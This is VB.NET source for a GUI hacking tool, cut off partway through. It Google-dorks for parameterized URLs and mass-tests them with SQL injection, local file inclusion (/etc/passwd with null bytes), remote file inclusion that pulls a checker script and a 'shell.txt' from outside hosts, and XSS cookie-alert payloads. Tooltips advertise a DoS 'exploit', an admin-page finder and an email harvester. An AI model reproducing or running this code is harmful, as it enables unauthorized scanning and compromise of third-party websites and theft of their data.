Imports System.Net
Imports System.IO
Imports System.ComponentModel
Imports System.Windows.Forms
Imports System.Text.RegularExpressions
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Windows.Forms.ToolTip
Public Class main
    ''''''''''''''''''''''''''''''
    '          Zapre             '
    '            &               '
    '         ItsNuub            '
    ''''''''''''''''''''''''''''''
    Private target As String
    Private trysite As String
    Public Delegate Sub ListViewMakeRowdelegate(ByVal lvw As ListView, ByVal item_title As String, ByVal subitem_titles As String())

    Public Sub New()
        AddHandler MyBase.Load, AddressOf Me.xplit_Load
        Me.InitializeComponent()
    End Sub

    Public Delegate Sub _chkadder(item As String)

    Public Delegate Sub progadd(value As Integer)

    Public Delegate Sub _chkdadder(lnk As String)

    Public Delegate Sub prgmax(max As Integer)

    Private pg As Integer

    Private dork As String

    Private dom As String

    Private Sub xplit_Load(ByVal sender As Object, ByVal e As EventArgs)
        System.Windows.Forms.Control.CheckForIllegalCrossThreadCalls = False
        '   Me
        Dim NnNnNnNnaa As New System.Threading.Thread(New System.Threading.ThreadStart(AddressOf Me.mainloader)) : NnNnNnNnaa.Start()
        Me.ssqli.Checked = True
        Me.domainbox.Enabled = False
    End Sub

    Private Sub domain_CheckedChanged(sender As Object, e As EventArgs) Handles domain.CheckedChanged
        If Me.domain.Checked Then
            Me.domainbox.Enabled = True
        Else
            Me.domainbox.Enabled = False
        End If
    End Sub

    Private Function getsrc(url As String) As String
        Dim result As String
        Try
            Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(url), HttpWebRequest)
            If url.ToString().Contains("etc/passwd") Then
                httpWebRequest.Timeout = 10000
            End If
            Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
            Dim streamReader As StreamReader = New StreamReader(httpWebResponse.GetResponseStream())
            Dim text As String = streamReader.ReadToEnd()
            httpWebResponse.Close()
            result = text
        Catch arg_54_0 As Exception
            ProjectData.SetProjectError(arg_54_0)
            result = Nothing
            ProjectData.ClearProjectError()
        End Try
        Return result
    End Function

    Private Sub chkadder(ByVal link As String)
        If (Me.chklist.InvokeRequired) Then
            Me.Invoke(New _chkadder(AddressOf Me.chkadder), New Object() {link})
        Else
            Me.chklist.Items.Add(link)
        End If
    End Sub

    Public Function URLDecode(StringToDecode As String) As String
        Dim text As String = String.Empty
        Dim num As Integer = 1
        While num - 1 <> Strings.Len(StringToDecode)
            Dim left As String = Strings.Mid(StringToDecode, num, 1)
            If Operators.CompareString(left, "+", False) = 0 Then
                text += " "
            Else
                If Operators.CompareString(left, "%", False) = 0 Then
                    text += Conversions.ToString(Strings.Chr(CInt(Math.Round(Conversion.Val("&h" + Strings.Mid(StringToDecode, num + 1, 2))))))
                    num += 2
                Else
                    text += Strings.Mid(StringToDecode, num, 1)
                End If
            End If
            num += 1
        End While
        Return text
    End Function

    Private Sub getlnks(src As String)
        Try
            Dim regex As Regex = New Regex("\bhref\S*=""/url\?q=(http://\S*?)&amp")
            Dim matchCollection As MatchCollection = regex.Matches(src)
            Try
                Dim enumerator As IEnumerator = matchCollection.GetEnumerator()
                While enumerator.MoveNext()
                    Dim match As Match = CType(enumerator.Current, Match)
                    If match.Groups(1).Value.ToString().StartsWith("http://", StringComparison.CurrentCultureIgnoreCase) AndAlso Not (match.Groups(1).Value.ToString().Contains("www.google.com") Or match.Groups(1).Value.ToString().Contains("www.youtube.com") Or match.Groups(1).Value.ToString().Contains("page2rss.com")) AndAlso Me.URLDecode(match.Groups(1).Value.ToString()).Contains("=") AndAlso Me.chklist.InvokeRequired Then
                        Me.chkadder(Me.URLDecode(match.Groups(1).Value.ToString()))
                    End If
                End While
            Finally
                Dim enumerator As IEnumerator
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        Catch expr_134 As Exception
            ProjectData.SetProjectError(expr_134)
            Dim ex As Exception = expr_134
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub dorkscanner_DoWork(sender As Object, e As DoWorkEventArgs) Handles dorkscanner.DoWork
        Dim arg_0A_0 As Integer = 0
        ' The following expression was wrapped in a checked-statement
        Dim num As Integer = Me.pg - 1
        For i As Integer = arg_0A_0 To num
            If Me.dorkscanner.CancellationPending Then
                Exit For
            End If
            Dim url As String
            If Me.domain.Checked Then
                url = String.Concat(New String() {"https://www.google.com/search?q=", Me.dorkbox.Text, " site:", Me.domainbox.Text, "&hl=en&num=100&start=", Conversions.ToString(i), "00"})
            Else
                url = String.Concat(New String() {"https://www.google.com/search?q=", Me.dorkbox.Text, "&hl=en&num=100&start=", Conversions.ToString(i), "00"})
            End If
            Dim text As String = Me.getsrc(url)
            If Operators.CompareString(text, Nothing, False) <> 0 Then
                Me.getlnks(text)
            End If
        Next
    End Sub

    Private Sub searchb_Click(sender As Object, e As EventArgs) Handles searchb.Click
        Me.dork = Me.dorkbox.Text
        Me.dom = Me.domainbox.Text
        Me.pg = Conversions.ToInteger(Me.pages.Text)
        Try
            If Operators.CompareString(Me.dork, "", False) = 0 Then
                MessageBox.Show("Please enter the dork", "Dork Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Else
                If Me.domain.Checked And Operators.CompareString(Me.dom, "", False) = 0 Then
                    MessageBox.Show("Please mention the domain", "Domain Missing", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                Else
                    Try
                        Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
                        While enumerator.MoveNext()
                            Dim control As Control = CType(enumerator.Current, Control)
                            If Operators.CompareString(control.Name, "stopb", False) <> 0 Then
                                control.Enabled = False
                            End If
                        End While
                    Finally
                        Dim enumerator As IEnumerator
                        If TypeOf enumerator Is IDisposable Then
                            TryCast(enumerator, IDisposable).Dispose()
                        End If
                    End Try
                    Me.dorkscanner.RunWorkerAsync()
                End If
            End If
        Catch expr_103 As Exception
            ProjectData.SetProjectError(expr_103)
            Dim ex As Exception = expr_103
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub dorkscanner_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles dorkscanner.RunWorkerCompleted
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "stopb", False) <> 0 And Operators.CompareString(control.Name, "proxyb", False) <> 0 Then
                    control.Enabled = True
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Me.ProgressBar1.Maximum = Me.chklist.Items.Count
        Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
        Me.vs.Text = Conversions.ToString(Me.chkdlist.Items.Count)
    End Sub

    Private Sub startb_Click(sender As Object, e As EventArgs) Handles startb.Click
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "stop2b", False) <> 0 Then
                    control.Enabled = False
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Try
            Dim enumerator2 As IEnumerator = Me.GroupBox2.Controls.GetEnumerator()
            While enumerator2.MoveNext()
                Dim control2 As Control = CType(enumerator2.Current, Control)
                control2.Enabled = False
            End While
        Finally
            Dim enumerator2 As IEnumerator
            If TypeOf enumerator2 Is IDisposable Then
                TryCast(enumerator2, IDisposable).Dispose()
            End If
        End Try
        Me.scnr.RunWorkerAsync()
    End Sub

    Private Sub progadder(ByVal value As Int32)
        If (Me.ProgressBar1.InvokeRequired) Then
            Me.Invoke(New progadd(AddressOf Me.progadder), New Object() {CType(value, Integer)})
        Else
            Dim progressbar1 As System.Windows.Forms.ProgressBar = Me.ProgressBar1
            progressbar1.Value = (progressbar1.Value + 1)
        End If
    End Sub

    Private Sub scnr_DoWork(sender As Object, e As DoWorkEventArgs) Handles scnr.DoWork
        Try
            If Me.ssqli.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc(objectValue.ToString().Replace("=", "='").ToString())
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.esqli(text) Then
                            Me.chkdadder(objectValue.ToString())
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator As IEnumerator
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.lfi.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator2 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator2.MoveNext()
                        Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(enumerator2.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc((objectValue2.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=Gr3eNoXchker.php%00"))
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.elfi(text) Then
                            Me.chkdadder((objectValue2.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=/etc/passwd%00"))
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator2 As IEnumerator
                    If TypeOf enumerator2 Is IDisposable Then
                        TryCast(enumerator2, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.lfifuzz.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator3 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator3.MoveNext()
                        Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(enumerator3.Current)
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        Try
                            Dim enumerator4 As IEnumerator = Me.fuzzlist.Items.GetEnumerator()
                            While enumerator4.MoveNext()
                                Dim objectValue4 As Object = RuntimeHelpers.GetObjectValue(enumerator4.Current)
                                If Me.scnr.CancellationPending Then
                                    Exit While
                                End If
                                Dim text As String = Me.getsrc((objectValue3.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", objectValue4.ToString()))
                                If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.efuzzlfi(text) Then
                                    Me.chkdadder((objectValue3.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", objectValue4.ToString()))
                                    toolStripStatusLabel = Me.vs
                                    toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                                    Exit While
                                End If
                                toolStripStatusLabel = Me.fs
                                toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                            End While
                        Finally
                            Dim enumerator4 As IEnumerator
                            If TypeOf enumerator4 Is IDisposable Then
                                TryCast(enumerator4, IDisposable).Dispose()
                            End If
                        End Try

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        Me.fs.Text = Conversions.ToString(0)
                    End While
                Finally
                    Dim enumerator3 As IEnumerator
                    If TypeOf enumerator3 Is IDisposable Then
                        TryCast(enumerator3, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.rfi.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator5 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator5.MoveNext()
                        Dim objectValue5 As Object = RuntimeHelpers.GetObjectValue(enumerator5.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc((objectValue5.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=http://gr3enox.net23.net/Checker.php%00"))
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If Operators.CompareString(text, Nothing, False) <> 0 AndAlso Me.erfi(text) Then
                            Me.chkdadder((objectValue5.ToString().Split(New Char() {"="}).GetValue(0).ToString() + "=").ToString().Replace("=", "=http://www.site.com/shell.txt?%00"))
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator5 As IEnumerator
                    If TypeOf enumerator5 Is IDisposable Then
                        TryCast(enumerator5, IDisposable).Dispose()
                    End If
                End Try
            End If
            If Me.xss.Checked Then
                Me.sf.Text = Conversions.ToString(Me.chklist.Items.Count)
                Me.progmax(Me.chklist.Items.Count)
                Me.ProgressBar1.Value = 0
                Try
                    Dim enumerator6 As IEnumerator = Me.chklist.Items.GetEnumerator()
                    While enumerator6.MoveNext()
                        Dim objectValue6 As Object = RuntimeHelpers.GetObjectValue(enumerator6.Current)
                        If Me.scnr.CancellationPending Then
                            Exit While
                        End If
                        Dim text As String = Me.getsrc(objectValue6.ToString() + """><script>alert(document.cookie)</script>")
                        Dim toolStripStatusLabel As ToolStripStatusLabel
                        If text IsNot Nothing AndAlso Me.exss(text) Then
                            Me.chkdadder(objectValue6.ToString())
                            toolStripStatusLabel = Me.vs
                            toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                        End If

                        Me.progadder(If((-(If(((Me.ProgressBar1.Value = Me.ProgressBar1.Value + 1) > False), 1, 0))), 1, 0))
                        toolStripStatusLabel = Me.sc
                        toolStripStatusLabel.Text = Conversions.ToString(Conversions.ToDouble(toolStripStatusLabel.Text) + 1.0)
                    End While
                Finally
                    Dim enumerator6 As IEnumerator
                    If TypeOf enumerator6 Is IDisposable Then
                        TryCast(enumerator6, IDisposable).Dispose()
                    End If
                End Try
            End If
        Catch expr_8BA As Exception
            ProjectData.SetProjectError(expr_8BA)
            Dim ex As Exception = expr_8BA
            MessageBox.Show(ex.Message)
            ProjectData.ClearProjectError()
        End Try
        'fuck you itsnuub that shit took years
    End Sub

    Private Sub chkdadder(ByVal link As String)
        If (Me.chkdlist.InvokeRequired) Then
            Me.Invoke(New _chkdadder(AddressOf Me.chkdadder), New Object() {link})
        Else
            Me.chkdlist.Items.Add(link.ToString())
        End If
        'no u lol noob
    End Sub

    Private Function esqli(src As String) As Boolean
        Dim result As Boolean
        Try
            Dim enumerator As IEnumerator = Me.sqlerrlist.Items.GetEnumerator()
            While enumerator.MoveNext()
                Dim text As String = Conversions.ToString(enumerator.Current)
                If src.Contains(text.ToString()) Then
                    result = True
                    Exit While
                End If
            End While 'asd
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Return result
    End Function

    Private Sub scnr_RunWorkerCompleted(sender As Object, e As RunWorkerCompletedEventArgs) Handles scnr.RunWorkerCompleted
        Try
            Dim enumerator As IEnumerator = Me.GroupBox1.Controls.GetEnumerator()
            While enumerator.MoveNext()
                Dim control As Control = CType(enumerator.Current, Control)
                If Operators.CompareString(control.Name, "proxyb", False) <> 0 Then
                    control.Enabled = True
                End If
            End While
        Finally
            Dim enumerator As IEnumerator
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        Try
            Dim enumerator2 As IEnumerator = Me.GroupBox2.Controls.GetEnumerator()
            While enumerator2.MoveNext()
                Dim control2 As Control = CType(enumerator2.Current, Control)
                If Operators.CompareString(control2.Name, "fsqli", False) <> 0 Then
                    control2.Enabled = True
                End If
            End While
        Finally
            Dim enumerator2 As IEnumerator
            If TypeOf enumerator2 Is IDisposable Then
                TryCast(enumerator2, IDisposable).Dispose()
            End If
        End Try
        Me.ProgressBar1.Value = 0
        Me.sc.Text = Conversions.ToString(0)
        Me.fs.Text = Conversions.ToString(0)
    End Sub

    Private Function elfi(src As String) As Boolean
        Return src.Contains("file not found") Or src.Contains("error: the listener returned the following message: 404 not found") Or src.Contains("http/1.0 404 object not found") Or src.Contains("the file that you requested could not be found on this server. if you provided the url")
    End Function

    Private Function erfi(src As String) As Boolean
        Return src.Contains("I 4m H3r3")
    End Function

    Private Function efuzzlfi(src As String) As Boolean
        Return src.Contains("root:")
    End Function

    Private Function exss(src As String) As Boolean
        Return src.Contains("""><script>alert(document.cookie)</script>") OrElse src.Contains("%22%22%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E%22")
    End Function

    Private Sub progmax(ByVal max As Int32)
        If (Me.ProgressBar1.InvokeRequired) Then
            Me.Invoke(New prgmax(AddressOf Me.progmax), New Object() {CType(max, Integer)})
        Else
            Me.ProgressBar1.Maximum = max
        End If
    End Sub

    Private Sub joggintime_Tick(sender As Object, e As EventArgs) Handles joggintime.Tick
        If jogiin86text.Left = -10 Then
            jogiin86text.Left = 520
        Else
            jogiin86text.Left -= 10
        End If
    End Sub

    Private Sub main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim vulb As New ToolTip
        Dim copyc As New ToolTip
        Dim clearc As New ToolTip
        Dim resp As New ToolTip
        Dim cresp As New ToolTip
        Dim clre As New ToolTip
        Dim sresp As New ToolTip
        Dim ee As New ToolTip
        Dim b11 As New ToolTip
        Dim b9 As New ToolTip
        Dim b10 As New ToolTip
        Dim start As New ToolTip
        Dim b13 As New ToolTip
        Dim b12 As New ToolTip
        Dim b14 As New ToolTip
        Dim chk3 As New ToolTip
        Dim t1 As New ToolTip
        Dim c1 As New ToolTip
        Dim sb As New ToolTip
        Dim b6 As New ToolTip
        Dim stb As New ToolTip
        stb.AutoPopDelay = 5000
        stb.InitialDelay = 1000
        stb.ReshowDelay = 500
        stb.ShowAlways = True
        stb.SetToolTip(Me.startb, "Uses results and scans websites adding a ' at end of parameter and uses a dictionary of SQL errors to see if its vulnerable!")
        b6.AutoPopDelay = 5000
        b6.InitialDelay = 1000
        b6.ReshowDelay = 500
        b6.ShowAlways = True
        b6.SetToolTip(Me.Button6, "Save SQLi vulnerble links to a txt file!")
        sb.AutoPopDelay = 5000
        sb.InitialDelay = 1000
        sb.ReshowDelay = 500
        sb.ShowAlways = True
        sb.SetToolTip(Me.searchb, "Searches Google with your given dork and dumps results to listbox!")
        c1.AutoPopDelay = 5000
        c1.InitialDelay = 1000
        c1.ReshowDelay = 500
        c1.ShowAlways = True
        c1.SetToolTip(Me.CheckBox1, "Makes form stay ontop of every windows application!")
        t1.AutoPopDelay = 5000
        t1.InitialDelay = 1000
        t1.ReshowDelay = 500
        t1.ShowAlways = True
        t1.SetToolTip(Me.TrackBar1, "Change how fast webbrowser sends requests, lower number is faster!")
        chk3.AutoPopDelay = 5000
        chk3.InitialDelay = 1000
        chk3.ReshowDelay = 500
        chk3.ShowAlways = True
        chk3.SetToolTip(Me.CheckBox3, "Make the website think the request is coming from an iPhone, also displays what an iPhone would see!")
        b14.AutoPopDelay = 5000
        b14.InitialDelay = 1000
        b14.ReshowDelay = 500
        b14.ShowAlways = True
        b14.SetToolTip(Me.Button14, "Stop the exploit!")
        b12.AutoPopDelay = 5000
        b12.InitialDelay = 1000
        b12.ReshowDelay = 500
        b12.ShowAlways = True
        b12.SetToolTip(Me.Button12, "DoS a web server using a 508 packet exploit!")
        b13.AutoPopDelay = 5000
        b13.InitialDelay = 1000
        b13.ReshowDelay = 500
        b13.ShowAlways = True
        b13.SetToolTip(Me.Button13, "Stop the process of finding admin page!")
        start.AutoPopDelay = 5000
        start.InitialDelay = 1000
        start.ReshowDelay = 500
        start.ShowAlways = True
        start.SetToolTip(Me.start1, "Uses a dictionary of admin pages to try find one!")
        b10.AutoPopDelay = 5000
        b10.InitialDelay = 1000
        b10.ReshowDelay = 500
        b10.ShowAlways = True
        b10.SetToolTip(Button10, "Remove a highlighted email!")
        b9.AutoPopDelay = 5000
        b9.InitialDelay = 1000
        b9.ReshowDelay = 500
        b9.ShowAlways = True
        b9.SetToolTip(Button9, "Clear the whole list box's results!")
        b11.AutoPopDelay = 5000
        b11.InitialDelay = 1000
        b11.ReshowDelay = 500
        b11.ShowAlways = True
        b11.SetToolTip(Button11, "Copy a highlighted email to clipboard!")
        ee.AutoPopDelay = 5000
        ee.InitialDelay = 1000
        ee.ReshowDelay = 500
        ee.ShowAlways = True
        ee.SetToolTip(Button8, "Finds emails on the webpage in the src, does not crawl and search!")
        sresp.AutoPopDelay = 5000
        sresp.InitialDelay = 1000
        sresp.ReshowDelay = 500
        sresp.ShowAlways = True
        sresp.SetToolTip(Button2, "Saves response to a txt file")
        clre.AutoPopDelay = 5000
        clre.InitialDelay = 1000
        clre.ReshowDelay = 500
        clre.ShowAlways = True
        clre.SetToolTip(Me.Button3, "Clears the whole richtextbox!")
        cresp.AutoPopDelay = 5000
        cresp.InitialDelay = 1000
        cresp.ReshowDelay = 500
        cresp.ShowAlways = True
        cresp.SetToolTip(Me.Button1, "Copies the whole response to your clipboard!")
        resp.AutoPopDelay = 5000
        resp.InitialDelay = 1000
        resp.ReshowDelay = 500
        resp.ShowAlways = True
        resp.SetToolTip(Me.jogiinbutton, "Gets the response of connecting to a website in plaintext, may reveal unique information such as debugging info.")
        clearc.AutoPopDelay = 5000
        clearc.InitialDelay = 1000
        clearc.ReshowDelay = 500
        clearc.ShowAlways = True
        clearc.SetToolTip(Me.Button5, "Clear the whole listbox results!")
        copyc.AutoPopDelay = 5000
        copyc.InitialDelay = 1000
        copyc.ReshowDelay = 500
        copyc.ShowAlways = True
        copyc.SetToolTip(Me.Button7, "Copies a highlighted URL!")
        vulb.AutoPopDelay = 5000
        vulb.InitialDelay = 1000
        vulb.ReshowDelay = 500
        vulb.ShowAlways = True
        vulb.SetToolTip(Me.Button4, "Grabs all possible links on website!")
        checker.Start()
    End Sub

    Private Sub jogiinbutton_Click(sender As Object, e As EventArgs) Handles jogiinbutton.Click
        BackgroundWorker1.RunWorkerAsync()
        MsgBox("Started Process!", MsgBoxStyle.Information)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If jogiinhttp.Text = "" Then
            MsgBox("No Response Found?", MsgBoxStyle.Critical)
        Else
            My.Computer.Clipboard.SetText(jogiinhttp.Text)
            MsgBox("Copied Response!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim jogiinwriter As StreamWriter
        Dim jogiinresults As DialogResult
        jogiinresults = SaveFileDialog1.ShowDialog

        If jogiinresults = DialogResult.OK Then
            jogiinwriter = New StreamWriter(SaveFileDialog1.FileName, False)
            jogiinwriter.Write(jogiinhttp.Text)
            MsgBox("Saved File!", MsgBoxStyle.Information)
            jogiinwriter.Close()
            'ma teen coca cola shotiin
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If jogiinhttp.Text = "" Then
            MsgBox("No Response To Clear?", MsgBoxStyle.Critical)
        Else
            jogiinhttp.Clear()
            MsgBox("Cleared Response/s!", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub main_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        asd.Show()
    End Sub

    Private Function Spider(ByVal url As String, ByVal depth As Integer) As ArrayList
        Dim aReturn As New ArrayList
        Dim aStart As ArrayList = GrabUrls(url)
        Dim aTemp As ArrayList
        Dim aNew As New ArrayList
        aReturn.AddRange(aStart)
        If depth < 1 Then Return aReturn
        For i = 1 To depth
            For Each tUrl As String In aStart
                aTemp = GrabUrls(tUrl, aReturn, aNew)
                aNew.AddRange(aTemp)
            Next
            aStart = aNew
            aReturn.AddRange(aNew)
            aNew = New ArrayList
        Next
        Return aReturn
    End Function

    Private Overloads Function GrabUrls(ByVal url As String, ByRef aReturn As ArrayList, ByRef aNew As ArrayList) As ArrayList
        Dim tUrls As ArrayList = GrabUrls(url)
        Dim tReturn As New ArrayList
        For Each item As String In tUrls
            If Not aReturn.Contains(item) AndAlso Not aNew.Contains(item) Then
                tReturn.Add(item)
            End If
        Next
        Return tReturn
    End Function

    Private Overloads Function GrabUrls(ByVal url As String) As ArrayList
        Dim aReturn As New ArrayList
        Try
            Dim strRegex As String = "<a.*?href=""(.*?)"".*?>(.*?)</a>"
            Dim wc As New WebClient
            Dim strSource As String = wc.DownloadString(url)
            Dim HrefRegex As New Regex(strRegex, RegexOptions.IgnoreCase Or RegexOptions.Compiled)
            Dim HrefMatch As Match = HrefRegex.Match(strSource)
            Dim BaseUrl As New Uri(url)
            While HrefMatch.Success = True
                Dim sUrl As String = HrefMatch.Groups(1).Value
                If Not sUrl.Contains("http://") AndAlso Not sUrl.Contains("www") Then 'pornhub
                    Dim tURi As New Uri(BaseUrl, sUrl)
                    sUrl = tURi.ToString
                End If
                If Not aReturn.Contains(sUrl) Then aReturn.Add(sUrl)
                HrefMatch = HrefMatch.NextMatch
            End While
        Catch ex As Exception
        End Try

        Return aReturn
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        'too lazy to runasync to backgroundworker, deal with the lag - zapre
        Dim aList As ArrayList = Spider(jogiinhack.Text, 1)
        For Each url As String In aList
            jogiinurls.Items.Add(url)
        Next
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        My.Computer.Clipboard.SetText(String.Join(Environment.NewLine, jogiinurls.SelectedItems.Cast(Of String).ToArray))
        MsgBox("Copied URL!", MsgBoxStyle.Information)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        jogiinurls.Items.Clear()
        MsgBox("Cleared Crawls!", MsgBoxStyle.Information)
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Me.TopMost = True
        Else
            Me.TopMost = False
        End If
    End Sub

    Private Sub LinkLabel2_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel2.LinkClicked
        System.Diagnostics.Process.Start("https://youtube.com/c/zapre") 'noob channel
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        System.Diagnostics.Process.Start("https://youtube.com/c/itsnuubgt") 'sub bot
    End Sub

    Private Sub mainloader()
        Me.sqlerrlist.Items.Add("mysql_num_rows()")
        Me.sqlerrlist.Items.Add("mysql_fetch_array()")
        Me.sqlerrlist.Items.Add("Error Occurred While Processing Request")
        Me.sqlerrlist.Items.Add("Server Error in '/' Application")
        Me.sqlerrlist.Items.Add("Microsoft OLE DB Provider for ODBC Drivers error")
        Me.sqlerrlist.Items.Add("error in your SQL syntax")
        Me.sqlerrlist.Items.Add("Invalid Querystring")
        Me.sqlerrlist.Items.Add("OLE DB Provider for ODBC")
        Me.sqlerrlist.Items.Add("VBScript Runtime")
        Me.sqlerrlist.Items.Add("ADODB.Field")
        Me.sqlerrlist.Items.Add("BOF or EOF")
        Me.sqlerrlist.Items.Add("ADODB.Command")
        Me.sqlerrlist.Items.Add("mysql_fetch_row()")
        Me.sqlerrlist.Items.Add("Syntax error")
        Me.sqlerrlist.Items.Add("include()")
        Me.sqlerrlist.Items.Add("mysql_fetch_assoc()")
        Me.sqlerrlist.Items.Add("mysql_fetch_object()")
        Me.sqlerrlist.Items.Add("mysql_numrows()")
        Me.sqlerrlist.Items.Add("GetArray()")
